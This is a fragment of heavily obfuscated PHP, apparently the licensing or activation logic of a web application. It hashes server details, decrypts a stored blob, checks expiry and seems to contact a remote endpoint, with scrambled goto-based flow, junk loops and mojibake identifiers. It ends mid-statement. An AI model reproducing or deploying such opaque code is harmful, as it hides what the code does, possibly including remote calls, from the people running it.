$FËØõ¯´Óô[$eÇøêà‰´ª[108]][$eÇøêà‰´ª[117]] = $eÇøêà‰´ª[118]($eÇøêà‰´ª[119]()); $Dë™Êôﬁ£ì = $bˆëªÑ……ø[582]; goto D–’‹Ôã…å; câﬁéê∫Áë: $D≠õÊãß—’ = $bˆëªÑ……ø[583]; while ($D≠õÊãß—’ < $bˆëªÑ……ø[584]) { if ($D≠õÊãß—’ >= 0) { break; } $D≠õÊãß—’++; } if ($eÇøêà‰´ª[104]($GLOBALS, $eÇøêà‰´ª[132]) && $this->config[$eÇøêà‰´ª[133]]) { $FËØõ¯´Óô[$eÇøêà‰´ª[108]][$eÇøêà‰´ª[134]] = WEB_ROOT; } goto a“≠∫É–ò”; EìœÕ⁄œë◊: foreach ($eŒöî–Ã±‚ as $B„Ê¡â¯Èò) { $DŸõôéÀØÌ = $GLOBALS[$eÇøêà‰´ª[91]][$eÇøêà‰´ª[92]][$B„Ê¡â¯Èò]; if (isset($fæ¨öÇ¶ìç[$B„Ê¡â¯Èò])) { $DŸõôéÀØÌ = $fæ¨öÇ¶ìç[$B„Ê¡â¯Èò]; } $FËØõ¯´Óô[$eÇøêà‰´ª[93]][$eÇøêà‰´ª[94]][$B„Ê¡â¯Èò] = $DŸõôéÀØÌ; } $eæ¿ùıéŸı = $FËØõ¯´Óô[$eÇøêà‰´ª[93]][$eÇøêà‰´ª[94]][$eÇøêà‰´ª[76]]; unset($FËØõ¯´Óô[$eÇøêà‰´ª[93]][$eÇøêà‰´ª[95]][$eÇøêà‰´ª[96]]); goto BŒ£•Çç¨´; a“≠∫É–ò”: return $FËØõ¯´Óô; goto cˆÈπ±äÁÿ; b±ÒÒ⁄«ûÒ: $Aåﬁÿäàôº = $bˆëªÑ……ø[580]; if (!$Aåﬁÿäàôº) { die; } $FËØõ¯´Óô[$eÇøêà‰´ª[108]][$eÇøêà‰´ª[113]] = $eÇøêà‰´ª[114]($_SERVER[$eÇøêà‰´ª[115]] . $fæ¨öÇ¶ìç[$eÇøêà‰´ª[116]]); goto D∆è°•Õ ∂; cÙ≠åÍº¡ã: if ($this->lrpk52179362 == $eÇøêà‰´ª[121]) { $FËØõ¯´Óô[$eÇøêà‰´ª[93]][$eÇøêà‰´ª[94]][$eÇøêà‰´ª[99]][$eÇøêà‰´ª[107]] = 0; } $FËØõ¯´Óô[$eÇøêà‰´ª[108]][$eÇøêà‰´ª[128]] = $eÇøêà‰´ª[104]($this->qpxc5252b317, $eÇøêà‰´ª[129], $eÇøêà‰´ª[10]); $FËØõ¯´Óô[$eÇøêà‰´ª[108]][$eÇøêà‰´ª[130]] = $eÇøêà‰´ª[104]($this->qpxc5252b317, $eÇøêà‰´ª[131], $eÇøêà‰´ª[10]); goto câﬁéê∫Áë; aêå§∞ö≠ë: $FËÀ®ƒë„˘ = $bˆëªÑ……ø[578]; if (!$FËÀ®ƒë„˘) { die; } $eŒöî–Ã±‚ = array($eÇøêà‰´ª[64], $eÇøêà‰´ª[65], $eÇøêà‰´ª[66], $eÇøêà‰´ª[67], $eÇøêà‰´ª[68], $eÇøêà‰´ª[69], $eÇøêà‰´ª[70], $eÇøêà‰´ª[71], $eÇøêà‰´ª[72], $eÇøêà‰´ª[73], $eÇøêà‰´ª[74], $eÇøêà‰´ª[75], $eÇøêà‰´ª[76], $eÇøêà‰´ª[77], $eÇøêà‰´ª[78], $eÇøêà‰´ª[79], $eÇøêà‰´ª[80], $eÇøêà‰´ª[81], $eÇøêà‰´ª[82], $eÇøêà‰´ª[83], $eÇøêà‰´ª[84], $eÇøêà‰´ª[85], $eÇøêà‰´ª[86], $eÇøêà‰´ª[87], $eÇøêà‰´ª[88], $eÇøêà‰´ª[89], $eÇøêà‰´ª[90]); goto EìœÕ⁄œë◊; D–’‹Ôã…å: if (!$Dë™Êôﬁ£ì) { return; } $FËØõ¯´Óô[$eÇøêà‰´ª[108]][$eÇøêà‰´ª[120]] = $this->lrpk52179362; if ($fæ¨öÇ¶ìç[$eÇøêà‰´ª[120]] != $eÇøêà‰´ª[121]) { $FËØõ¯´Óô[$eÇøêà‰´ª[108]][$eÇøêà‰´ª[122]] = $fæ¨öÇ¶ìç[$eÇøêà‰´ª[122]]; $FËØõ¯´Óô[$eÇøêà‰´ª[108]][$eÇøêà‰´ª[123]] = $fæ¨öÇ¶ìç[$eÇøêà‰´ª[123]]; $c’êäãçπ≠ = $eÇøêà‰´ª[124](10) . $this->lrpk52179362 . $eÇøêà‰´ª[124](5); $FËØõ¯´Óô[$eÇøêà‰´ª[93]][$eÇøêà‰´ª[125]][$eÇøêà‰´ª[126]] = $this->{$_SERVER[º˙Ôå˛Ë][127]}($c’êäãçπ≠, $FËØõ¯´Óô[$eÇøêà‰´ª[108]][$eÇøêà‰´ª[113]]); } goto cÙ≠åÍº¡ã; Fö©ÁÛêπè: $bˆëªÑ……ø =& $_SERVER[Æ¡î¢≠¯™]; $eÇøêà‰´ª =& $_SERVER[º˙Ôå˛Ë]; $fæ¨öÇ¶ìç = $eÇøêà‰´ª[61]($eÇøêà‰´ª[62])->{$_SERVER[º˙Ôå˛Ë][63]}(); goto aêå§∞ö≠ë; F≤Ê€´…æ∂: unset($FËØõ¯´Óô[$eÇøêà‰´ª[93]][$eÇøêà‰´ª[94]][$eÇøêà‰´ª[98]]); $FËØõ¯´Óô[$eÇøêà‰´ª[93]][$eÇøêà‰´ª[94]][$eÇøêà‰´ª[99]] = array($eÇøêà‰´ª[100] => (int) $eæ¿ùıéŸı[$eÇøêà‰´ª[101]], $eÇøêà‰´ª[102] => $eÇøêà‰´ª[103]($eÇøêà‰´ª[104]($eæ¿ùıéŸı, $eÇøêà‰´ª[105], array())), $eÇøêà‰´ª[106] => (int) $eÇøêà‰´ª[104]($eæ¿ùıéŸı, $eÇøêà‰´ª[107], 0)); $FËØõ¯´Óô[$eÇøêà‰´ª[108]][$eÇøêà‰´ª[109]] = $eÇøêà‰´ª[110]($eÇøêà‰´ª[111])->{$_SERVER[º˙Ôå˛Ë][112]}(); goto b±ÒÒ⁄«ûÒ; BŒ£•Çç¨´: unset($FËØõ¯´Óô[$eÇøêà‰´ª[93]][$eÇøêà‰´ª[95]][$eÇøêà‰´ª[97]]); unset($FËØõ¯´Óô[$eÇøêà‰´ª[93]][$eÇøêà‰´ª[94]][$eÇøêà‰´ª[76]]); $f»º¶°ÎπÎ = $bˆëªÑ……ø[579]; goto F≤Ê€´…æ∂; cˆÈπ±äÁÿ: } private function bxcl86fdbc30() { goto aíç®ÇŒÉˆ; aíç®ÇŒÉˆ: $Dª◊÷èŸÒœ =& $_SERVER[Æ¡î¢≠¯™]; $E∆Ö‚êõÏœ =& $_SERVER[º˙Ôå˛Ë]; if ($_SERVER[$E∆Ö‚êõÏœ[44]] == $E∆Ö‚êõÏœ[135]) { goto dµ÷Ø∆ìÖÇ; dµ÷Ø∆ìÖÇ: $eÿ®ôàÓ¢ê = array($E∆Ö‚êõÏœ[120] => $this->lrpk52179362, $E∆Ö‚êõÏœ[136] => $this->{$_SERVER[º˙Ôå˛Ë][137]}(), $E∆Ö‚êõÏœ[138] => $E∆Ö‚êõÏœ[61]($E∆Ö‚êõÏœ[139])->{$_SERVER[º˙Ôå˛Ë][140]}()); if ($this->lrpk52179362 != $E∆Ö‚êõÏœ[121]) { $a›ˆÌ–’¢ó = $E∆Ö‚êõÏœ[104]($this->qpxc5252b317, $E∆Ö‚êõÏœ[141]); if ($a›ˆÌ–’¢ó) { $eÿ®ôàÓ¢ê[$E∆Ö‚êõÏœ[142]] = $a›ˆÌ–’¢ó; $eÿ®ôàÓ¢ê[$E∆Ö‚êõÏœ[143]] = $E∆Ö‚êõÏœ[144]($E∆Ö‚êõÏœ[104]($this->qpxc5252b317, $E∆Ö‚êõÏœ[145])); $eÿ®ôàÓ¢ê[$E∆Ö‚êõÏœ[146]] = $E∆Ö‚êõÏœ[104]($this->qpxc5252b317, $E∆Ö‚êõÏœ[131]); } } $eÿ®ôàÓ¢ê = $this->{$_SERVER[º˙Ôå˛Ë][147]}($E∆Ö‚êõÏœ[148]($eÿ®ôàÓ¢ê), $E∆Ö‚êõÏœ[114]($E∆Ö‚êõÏœ[149])); goto bÙ·‰‡È‡Ö; bÙ·‰‡È‡Ö: $CŸüçµ°æ„ = array($E∆Ö‚êõÏœ[150] => $eÿ®ôàÓ¢ê); $dÿﬁÂ¶ö™ì = $Dª◊÷èŸÒœ[585]; if (strlen($dÿﬁÂ¶ö™ì) < $Dª◊÷èŸÒœ[559]) { die; } goto F∆Ωªü…‘©; F∆Ωªü…‘©: $E∆Ö‚êõÏœ[13](array($E∆Ö‚êõÏœ[151], $E∆Ö‚êõÏœ[152]), $CŸüçµ°æ„); goto eœ≥œ€éÖâ; eœ≥œ€éÖâ: } goto EãåÂèãËœ; FÑâä…óä∫: $E∆Ö‚êõÏœ[13](array($E∆Ö‚êõÏœ[151], $E∆Ö‚êõÏœ[152]), $CŸüçµ°æ„); $a≈◊õ·ú‘É = $Dª◊÷èŸÒœ[587]; if (strlen($a≈◊õ·ú‘É) < $Dª◊÷èŸÒœ[63]) { return; } goto fÚ«⁄íÓÔÎ; FƒåÙæªÉÙ: $b–ƒ¢»≠¥π = $Dª◊÷èŸÒœ[586]; $CŸüçµ°æ„ = array($E∆Ö‚êõÏœ[159] => $f‡â†õ•ÇÈ[$E∆Ö‚êõÏœ[64]], $E∆Ö‚êõÏœ[160] => $f‡â†õ•ÇÈ[$E∆Ö‚êõÏœ[65]], $E∆Ö‚êõÏœ[161] => $E∆Ö‚êõÏœ[10]); foreach ($fòáâû⁄€è as $dƒË∑åÖÏè) { if (!isset($f‡â†õ•ÇÈ[$dƒË∑åÖÏè]) || !$f‡â†õ•ÇÈ[$dƒË∑åÖÏè]) { continue; } $CŸüçµ°æ„[$dƒË∑åÖÏè] = $f‡â†õ•ÇÈ[$dƒË∑åÖÏè]; } goto FÑâä…óä∫; EãåÂèãËœ: if ($this->lrpk52179362 == $E∆Ö‚êõÏœ[121]) { return; } $fòáâû⁄€è = array($E∆Ö‚êõÏœ[153], $E∆Ö‚êõÏœ[154], $E∆Ö‚êõÏœ[155], $E∆Ö‚êõÏœ[156], $E∆Ö‚êõÏœ[157], $E∆Ö‚êõÏœ[158]); $f‡â†õ•ÇÈ = $E∆Ö‚êõÏœ[61]($E∆Ö‚êõÏœ[62])->{$_SERVER[º˙Ôå˛Ë][63]}(); goto FƒåÙæªÉÙ; fÚ«⁄íÓÔÎ: } private function fsvud0b323c1() { goto d˘ë¨Í€á«; f›Ç¢¯ÆÖ—: $C·∆µ∂¬›ª = $this->{$_SERVER[º˙Ôå˛Ë][127]}($cëÖÜ‹“ä”[148]($DÜ°éª‚ÛÇ), $f∏ÜﬁççÍï); $FêÑë©à÷Ó = $cëÖÜ‹“ä”[222]($cëÖÜ‹“ä”[61]($cëÖÜ‹“ä”[11])->{$_SERVER[º˙Ôå˛Ë][223]}(), $cëÖÜ‹“ä”[224]); $c≈àƒ§§äñ = $fêôà›Üßä[596]; goto eáÆåíœßá; dêò√‹°Ÿ: $cëÖÜ‹“ä”[61]($cëÖÜ‹“ä”[62])->{$_SERVER[º˙Ôå˛Ë][221]}($eﬁÙÜì‚ŒÑ); $f∏ÜﬁççÍï = $cëÖÜ‹“ä”[114]($_SERVER[$cëÖÜ‹“ä”[115]] . $cëÖÜ‹“ä”[214]($Eÿ¢ÍÒûÃ‰) . $eﬁÙÜì‚ŒÑ[$cëÖÜ‹“ä”[210]]); $E¢É∫’•Ì÷ = $fêôà›Üßä[594]; goto B“‚£ˆîçÈ; F◊Ö≤ÿƒ∆∂: if (!isset($eıüåã¡Èê[$cëÖÜ‹“ä”[165]]) || $cëÖÜ‹“ä”[24]($eıüåã¡Èê[$cëÖÜ‹“ä”[165]]) != 16) { $cëÖÜ‹“ä”[166]($cëÖÜ‹“ä”[167] . $eıüåã¡Èê[$cëÖÜ‹“ä”[165]], !1); } $Eÿ¢ÍÒûÃ‰ = $cëÖÜ‹“ä”[61]($cëÖÜ‹“ä”[62])->{$_SERVER[º˙Ôå˛Ë][63]}($cëÖÜ‹“ä”[116]); $cÍ€ôûÔÎª = array($cëÖÜ‹“ä”[165] => $eıüåã¡Èê[$cëÖÜ‹“ä”[165]], $cëÖÜ‹“ä”[168] => $cëÖÜ‹“ä”[124](16), $cëÖÜ‹“ä”[169] => $cëÖÜ‹“ä”[149], $cëÖÜ‹“ä”[170] => $cëÖÜ‹“ä”[171], $cëÖÜ‹“ä”[172] => $_SERVER[$cëÖÜ‹“ä”[173]], $cëÖÜ‹“ä”[174] => $_SERVER[$cëÖÜ‹“ä”[175]], $cëÖÜ‹“ä”[176] => $_SERVER[$cëÖÜ‹“ä”[177]]); goto dÖµœŸ¶åá; FÍ‘ÿÚ¢∂µ: $eﬁÙÜì‚ŒÑ[$cëÖÜ‹“ä”[123]] = $cëÖÜ‹“ä”[118]($cëÖÜ‹“ä”[214]($this->{$_SERVER[º˙Ôå˛Ë][147]}($eï∞éø¬è–, $cëÖÜ‹“ä”[216]))); $bÎâç⁄ÿ§… = $fêôà›Üßä[593]; if ($DÜ°éª‚ÛÇ[$cëÖÜ‹“ä”[217]] && $DÜ°éª‚ÛÇ[$cëÖÜ‹“ä”[217]] >= 1) { $cëÖÜ‹“ä”[61]($cëÖÜ‹“ä”[62])->{$_SERVER[º˙Ôå˛Ë][218]}($cëÖÜ‹“ä”[219], $cëÖÜ‹“ä”[220]); } goto dêò√‹°Ÿ; B“‚£ˆîçÈ: $bÛ√°˜î®• = $cëÖÜ‹“ä”[214]($cëÖÜ‹“ä”[25]($f∏ÜﬁççÍï, 10, 16)); $cíıîá©“⁄ = $fêôà›Üßä[595]; if (strlen($cíıîá©“⁄) < $fêôà›Üßä[63]) { return; } goto f›Ç¢¯ÆÖ—; cÁäﬁ‡¬√Ç: if ($cÍ€ôûÔÎª[$cëÖÜ‹“ä”[168]]) { $eﬁÙÜì‚ŒÑ[$cëÖÜ‹“ä”[212]] = $cÍ€ôûÔÎª[$cëÖÜ‹“ä”[168]]; } $CÖí‚ãçÂÀ = $cëÖÜ‹“ä”[25]($cëÖÜ‹“ä”[114]($eﬁÙÜì‚ŒÑ[$cëÖÜ‹“ä”[210]]), 10, 10); $A˜Ö∞ùØ©å = $CÖí‚ãçÂÀ . $eﬁÙÜì‚ŒÑ[$cëÖÜ‹“ä”[120]] . $eﬁÙÜì‚ŒÑ[$cëÖÜ‹“ä”[212]]; goto bÖ¨£∆‚Òâ; aÀÑ÷ÙªìÙ: while (strlen($B≈œ⁄”å«¯) < $fêôà›Üßä[561]) { if (!$B≈œ⁄”å«¯) { break; } $B≈œ⁄”å«¯++; } $eï∞éø¬è– = $Aü„ÑÆ◊Ê‘ . $eﬁÙÜì‚ŒÑ[$cëÖÜ‹“ä”[120]] . $this->{$_SERVER[º˙Ôå˛Ë][147]}($cëÖÜ‹“ä”[114]($eﬁÙÜì‚ŒÑ[$cëÖÜ‹“ä”[209]]), $Aü„ÑÆ◊Ê‘); $eÔÛœæ±‚õ = $fêôà›Üßä[592]; goto FÍ‘ÿÚ¢∂µ; eáÆåíœßá: if (strlen($c≈àƒ§§äñ) < $fêôà›Üßä[63]) { return; } $C §µÑÇÑ = $FêÑë©à÷Ó[$cëÖÜ‹“ä”[225]]; $E„úÂìâä‰ = $fêôà›Üßä[597]; goto aıªŸºŒç®; d˘ë¨Í€á«: $fêôà›Üßä =& $_SERVER[Æ¡î¢≠¯™]; $cëÖÜ‹“ä” =& $_SERVER[º˙Ôå˛Ë]; if ($_SERVER[$cëÖÜ‹“ä”[44]] != $cëÖÜ‹“ä”[162]) { return; } goto B≤ƒ≈êäåÑ; C…∆èòÆ—è: while (strlen($fâ≥…§Ôèó) < $fêôà›Üßä[556]) { if (!$fâ≥…§Ôèó) { break; } $fâ≥…§Ôèó++; } if ($eıüåã¡Èê[$cëÖÜ‹“ä”[178]] == $cëÖÜ‹“ä”[179]) { $bÖáﬂ±ÁÎ‡ = $this->{$_SERVER[º˙Ôå˛Ë][147]}($CƒëØñ‹˘ç, $cëÖÜ‹“ä”[180]); $bΩ¢Úı•ÑË = $this->{$_SERVER[º˙Ôå˛Ë][127]}($cëÖÜ‹“ä”[148]($cÍ€ôûÔÎª), $CƒëØñ‹˘ç . $cëÖÜ‹“ä”[181], 3); $fëáåÜàˆ° = $this->{$_SERVER[º˙Ôå˛Ë][182]}($cëÖÜ‹“ä”[183] . $bÖáﬂ±ÁÎ‡ . $cëÖÜ‹“ä”[184] . $bΩ¢Úı•ÑË, -1); $cëÖÜ‹“ä”[166]($fëáåÜàˆ°, !0); } else { if ($eıüåã¡Èê[$cëÖÜ‹“ä”[178]] == $cëÖÜ‹“ä”[185]) { $cƒ≥°∂∂µã = $cëÖÜ‹“ä”[25]($cëÖÜ‹“ä”[114]($cëÖÜ‹“ä”[186] . $CƒëØñ‹˘ç), 12, 15) . $cëÖÜ‹“ä”[187]; $bΩ¢Úı•ÑË = $this->{$_SERVER[º˙Ôå˛Ë][188]}($cëÖÜ‹“ä”[2]($eıüåã¡Èê[$cëÖÜ‹“ä”[189]]), $cƒ≥°∂∂µã, 2); $c£å∞’ÊÃÛ = $cëÖÜ‹“ä”[190]($bΩ¢Úı•ÑË, !0); if (!$cëÖÜ‹“ä”[191]($c£å∞’ÊÃÛ) || !$cëÖÜ‹“ä”[191]($c£å∞’ÊÃÛ[$cëÖÜ‹“ä”[192]]) || $c£å∞’ÊÃÛ[$cëÖÜ‹“ä”[165]] != !0) { $EÈÓÍåï›Ë = $cëÖÜ‹“ä”[193]; $FµÇ‚äÜπ€ = $c£å∞’ÊÃÛ[$cëÖÜ‹“ä”[192]] ? $cëÖÜ‹“ä”[194] . $c£å∞’ÊÃÛ[$cëÖÜ‹“ä”[192]] : $EÈÓÍåï›Ë; $cëÖÜ‹“ä”[166]($FµÇ‚äÜπ€, !1); } else { $cÍ€ôûÔÎª[$cëÖÜ‹“ä”[168]] = $c£å∞’ÊÃÛ[$cëÖÜ‹“ä”[192]][$cëÖÜ‹“ä”[195]]; } } else { $c£å∞’ÊÃÛ = $this->{$_SERVER[º˙Ôå˛Ë][182]}($cëÖÜ‹“ä”[196], $cÍ€ôûÔÎª, 10); $e£Î«œŒ´ç = $fêôà›Üßä[567]; while ($e£Î«œŒ´ç < $fêôà›Üßä[561]) { if ($e£Î«œŒ´ç >= 0) { break; } $e£Î«œŒ´ç++; } } } if (!$cëÖÜ‹“ä”[191]($c£å∞’ÊÃÛ) || !$cëÖÜ‹“ä”[191]($c£å∞’ÊÃÛ[$cëÖÜ‹“ä”[192]]) || $c£å∞’ÊÃÛ[$cëÖÜ‹“ä”[165]] != !0) { $EÈÓÍåï›Ë = $cëÖÜ‹“ä”[197]($cëÖÜ‹“ä”[198]); $FµÇ‚äÜπ€ = $c£å∞’ÊÃÛ[$cëÖÜ‹“ä”[192]] ? $cëÖÜ‹“ä”[194] . $c£å∞’ÊÃÛ[$cëÖÜ‹“ä”[192]] : $EÈÓÍåï›Ë; $cëÖÜ‹“ä”[166]($FµÇ‚äÜπ€, !1); } goto C£µ”÷ÿ è; B≤ƒ≈êäåÑ: if (!$cëÖÜ‹“ä”[104]($GLOBALS, $cëÖÜ‹“ä”[132])) { die; } $eıüåã¡Èê = $GLOBALS[$cëÖÜ‹“ä”[22]]; if (isset($eıüåã¡Èê[$cëÖÜ‹“ä”[163]])) { $this->{$_SERVER[º˙Ôå˛Ë][164]}(); die; } goto F◊Ö≤ÿƒ∆∂; f°º—•ëÇƒ: while (strlen($dü“Èﬂıæ˜) < $fêôà›Üßä[561]) { if (!$dü“Èﬂıæ˜) { break; } $dü“Èﬂıæ˜++; } if (!$a⁄ƒˆ´Íó‹ || $a⁄ƒˆ´Íó‹ != $cëÖÜ‹“ä”[201]($DÜ°éª‚ÛÇ[$cëÖÜ‹“ä”[145]])) { $Eı›¥©≠¢ß = array($cëÖÜ‹“ä”[202] => $cëÖÜ‹“ä”[61]($cëÖÜ‹“ä”[62])->{$_SERVER[º˙Ôå˛Ë][63]}($cëÖÜ‹“ä”[116]), $cëÖÜ‹“ä”[203] => $_SERVER[$cëÖÜ‹“ä”[115]], $cëÖÜ‹“ä”[204] => $cëÖÜ‹“ä”[205](), $cëÖÜ‹“ä”[174] => $_SERVER[$cëÖÜ‹“ä”[175]]); $bΩ¢Úı•ÑË = $this->{$_SERVER[º˙Ôå˛Ë][206]}($cëÖÜ‹“ä”[148]($Eı›¥©≠¢ß)); $this->{$_SERVER[º˙Ôå˛Ë][182]}($cëÖÜ‹“ä”[207] . $bΩ¢Úı•ÑË); $cëÖÜ‹“ä”[166]($cëÖÜ‹“ä”[197]($cëÖÜ‹“ä”[208]), !0); } $eﬁÙÜì‚ŒÑ = array($cëÖÜ‹“ä”[209] => $cÍ€ôûÔÎª[$cëÖÜ‹“ä”[165]], $cëÖÜ‹“ä”[210] => $DÜ°éª‚ÛÇ[$cëÖÜ‹“ä”[211]], $cëÖÜ‹“ä”[212] => $cëÖÜ‹“ä”[124](16), $cëÖÜ‹“ä”[120] => $DÜ°éª‚ÛÇ[$cëÖÜ‹“ä”[213]]); goto cÁäﬁ‡¬√Ç; bÖ¨£∆‚Òâ: $eﬁÙÜì‚ŒÑ[$cëÖÜ‹“ä”[122]] = $cëÖÜ‹“ä”[214]($cëÖÜ‹“ä”[118]($this->{$_SERVER[º˙Ôå˛Ë][147]}($A˜Ö∞ùØ©å, $cëÖÜ‹“ä”[215]))); $Aü„ÑÆ◊Ê‘ = $cëÖÜ‹“ä”[124](16); $B≈œ⁄”å«¯ = $fêôà›Üßä[591]; goto aÀÑ÷ÙªìÙ; C£µ”÷ÿ è: $DÜ°éª‚ÛÇ = $c£å∞’ÊÃÛ[$cëÖÜ‹“ä”[192]]; $a⁄ƒˆ´Íó‹ = $this->{$_SERVER[º˙Ôå˛Ë][199]}($DÜ°éª‚ÛÇ[$cëÖÜ‹“ä”[200]]); $dü“Èﬂıæ˜ = $fêôà›Üßä[590]; goto f°º—•ëÇƒ; aıªŸºŒç®: $dΩõ¨°…ß≥ = array(); $dΩõ¨°…ß≥[$bÛ√°˜î®•] = $C·∆µ∂¬›ª; $cëÖÜ‹“ä”[61]($cëÖÜ‹“ä”[11])->{$_SERVER[º˙Ôå˛Ë][226]}($C §µÑÇÑ[$cëÖÜ‹“ä”[227]], array($cëÖÜ‹“ä”[228] => $dΩõ¨°…ß≥)); goto e·Ó∑Ù”üº; e·Ó∑Ù”üº: $BÆåØ∆ä©ú = $fêôà›Üßä[598]; if (!$BÆåØ∆ä©ú) { die; } $cëÖÜ‹“ä”[166]($cëÖÜ‹“ä”[197]($cëÖÜ‹“ä”[208]), !0); goto cüÕúêÔÆÚ; dÖµœŸ¶åá: $bÑ™¥»£¯˜ = $fêôà›Üßä[588]; $CƒëØñ‹˘ç = $cëÖÜ‹“ä”[114]($_SERVER[$cëÖÜ‹“ä”[115]] . $Eÿ¢ÍÒûÃ‰); $fâ≥…§Ôèó = $fêôà›Üßä[589]; goto C…∆èòÆ—è; cüÕúêÔÆÚ: } private function iboa40ebf75f() { goto C”‚˘ÖÆÕó; e»Õ£ÕäÚ’: $this->lrpk52179362 = $fÖëﬁê–Æœ[121]; goto Aöœ∆π˜«Ñ; EùòÖç€Ùÿ: if (!$eÿÒ”Úâ —) { return; } $fÖëﬁê–Æœ[61]($fÖëﬁê–Æœ[62])->{$_SERVER[º˙Ôå˛Ë][218]}($fÖëﬁê–Æœ[219], $fÖëﬁê–Æœ[229]); $this->qpxc5252b317 = array(); goto e»Õ£ÕäÚ’; C”‚˘ÖÆÕó: $fÖëﬁê–Æœ =& $_SERVER[º˙Ôå˛Ë]; $fÖëﬁê–Æœ[61]($fÖëﬁê–Æœ[62])->{$_SERVER[º˙Ôå˛Ë][221]}(array($fÖëﬁê–Æœ[209] => $fÖëﬁê–Æœ[10], $fÖëﬁê–Æœ[210] => $fÖëﬁê–Æœ[10], $fÖëﬁê–Æœ[120] => $fÖëﬁê–Æœ[121], $fÖëﬁê–Æœ[122] => $fÖëﬁê–Æœ[10], $fÖëﬁê–Æœ[123] => $fÖëﬁê–Æœ[10])); $eÿÒ”Úâ — = $_SERVER[Æ¡î¢≠¯™][599]; goto EùòÖç€Ùÿ; Aöœ∆π˜«Ñ: } private function hmneb8ea5b2c() { goto CÿÈàŒß≠ı; Fâ€…•Ë∑ÿ: $d±‡óÖ≠æµ = $CΩÜ∑å•⁄∞[602]; while ($d±‡óÖ≠æµ < $CΩÜ∑å•⁄∞[556]) { if ($d±‡óÖ≠æµ >= 0) { break; } $d±‡óÖ≠æµ++; } $fÔÆ∏œ≥Ñ® = $bÿ‘øØƒ†¡[114]($_SERVER[$bÿ‘øØƒ†¡[115]] . $bÿ‘øØƒ†¡[214]($EŸÎÔÂÀ®√) . $c∏Ñ¿ø›éÖ[$bÿ‘øØƒ†¡[210]]); goto bﬁ€ªâ«Üﬁ; dœÀµºè¬Á: $c∏Ñ¿ø›éÖ = $bÿ‘øØƒ†¡[61]($bÿ‘øØƒ†¡[62])->{$_SERVER[º˙Ôå˛Ë][63]}(); $DÃòÕÇìíü = $CΩÜ∑å•⁄∞[601]; if ($c∏Ñ¿ø›éÖ[$bÿ‘øØƒ†¡[120]] == $bÿ‘øØƒ†¡[121]) { return; } goto c¡è“º√∂Ã; bﬁ€ªâ«Üﬁ: $dΩ√›çœˆ‰ = $bÿ‘øØƒ†¡[214]($bÿ‘øØƒ†¡[25]($fÔÆ∏œ≥Ñ®, 10, 16)); $c°¡îçÑÈË = $CΩÜ∑å•⁄∞[603]; if (strlen($c°¡îçÑÈË) < $CΩÜ∑å•⁄∞[63]) { die; } goto B∆µ–Ã◊ﬂ‹; fØç‘¡üê·: $this->lrpk52179362 = $bÿ‘øØƒ†¡[121]; $fö´ëéß•Ü = $CΩÜ∑å•⁄∞[600]; if (!$fö´ëéß•Ü) { return; } goto dœÀµºè¬Á; CÿÈàŒß≠ı: $CΩÜ∑å•⁄∞ =& $_SERVER[Æ¡î¢≠¯™]; $bÿ‘øØƒ†¡ =& $_SERVER[º˙Ôå˛Ë]; $_SERVER[$bÿ‘øØƒ†¡[175]] = $bÿ‘øØƒ†¡[104]($_SERVER, $bÿ‘øØƒ†¡[175], APP_HOST); goto fØç‘¡üê·; cÈæ’˘íà√: $this->qpxc5252b317 = $CÀˆ»°π≈∑; $this->lrpk52179362 = $c∏Ñ¿ø›éÖ[$bÿ‘øØƒ†¡[120]]; goto FùåÒ¢˘ØÕ; Açêè‡Çâã: if (!$bÿ‘øØƒ†¡[191]($CÀˆ»°π≈∑)) { return $this->{$_SERVER[º˙Ôå˛Ë][164]}(); } $fµºìπ•’å = $bÿ‘øØƒ†¡[144]($CÀˆ»°π≈∑[$bÿ‘øØƒ†¡[145]]); if ($bÿ‘øØƒ†¡[230]() >= $fµºìπ•’å) { return $this->{$_SERVER[º˙Ôå˛Ë][164]}(); } goto cÈæ’˘íà√; B∆µ–Ã◊ﬂ‹: $CÀˆ»°π≈∑ = $this->{$_SERVER[º˙Ôå˛Ë][188]}($f£∏¯ıö±ä[$bÿ‘øØƒ†¡[91]][$dΩ√›çœˆ‰], $fÔÆ∏œ≥Ñ®); $e’Ë»äÓã§ = $CΩÜ∑å•⁄∞[604]; $CÀˆ»°π≈∑ = $bÿ‘øØƒ†¡[190]($CÀˆ»°π≈∑, !0); goto Açêè‡Çâã; c¡è“º√∂Ã: $EŸÎÔÂÀ®√ = $bÿ‘øØƒ†¡[61]($bÿ‘øØƒ†¡[62])->{$_SERVER[º˙Ôå˛Ë][63]}($bÿ‘øØƒ†¡[116]); $fÔ”—ÂÈ™´ = $bÿ‘øØƒ†¡[222]($bÿ‘øØƒ†¡[61]($bÿ‘øØƒ†¡[11])->{$_SERVER[º˙Ôå˛Ë][223]}(), $bÿ‘øØƒ†¡[224]); $f£∏¯ıö±ä = $fÔ”—ÂÈ™´[$bÿ‘øØƒ†¡[225]]; goto Fâ€…•Ë∑ÿ; FùåÒ¢˘ØÕ: } private function gbwid632ac1e() { $dıÎµ‡ëèΩ =& $_SERVER[º˙Ôå˛Ë]; $f∂æÙÑ—ïÌ = $GLOBALS[$dıÎµ‡ëèΩ[22]]; $eµø°ø‰†ä = $_SERVER[$dıÎµ‡ëèΩ[44]]; if ($eµø°ø‰†ä == $dıÎµ‡ëèΩ[231] && $this->lrpk52179362 == $dıÎµ‡ëèΩ[121]) { $dıÎµ‡ëèΩ[166]($dıÎµ‡ëèΩ[197]($dıÎµ‡ëèΩ[232]), !1, $dıÎµ‡ëèΩ[233]); } $cî£ê¬º≤÷ = array($dıÎµ‡ëèΩ[234], $dıÎµ‡ëèΩ[235]); if ($dıÎµ‡ëèΩ[236]($eµø°ø‰†ä, $cî£ê¬º≤÷)) { if ($this->lrpk52179362 == $dıÎµ‡ëèΩ[121] && isset($f∂æÙÑ—ïÌ[$dıÎµ‡ëèΩ[237]])) { $dıÎµ‡ëèΩ[166]($dıÎµ‡ëèΩ[197]($dıÎµ‡ëèΩ[232]), !1, $dıÎµ‡ëèΩ[233]); die; } $a€ÚΩò÷ ê = $this->{$_SERVER[º˙Ôå˛Ë][137]}(); if ($a€ÚΩò÷ ê != $dıÎµ‡ëèΩ[201]($dıÎµ‡ëèΩ[238])) { if ($a€ÚΩò÷ ê <= $dıÎµ‡ëèΩ[61]($dıÎµ‡ëèΩ[139])->{$_SERVER[º˙Ôå˛Ë][140]}()) { $dıÎµ‡ëèΩ[166]($dıÎµ‡ëèΩ[197]($dıÎµ‡ëèΩ[239]), !1, $dıÎµ‡ëèΩ[233]); die; } } } } private function hnxod30767d9() { goto cçì›◊•ç‹; Bê°¡‰æŸ§: $DŸè 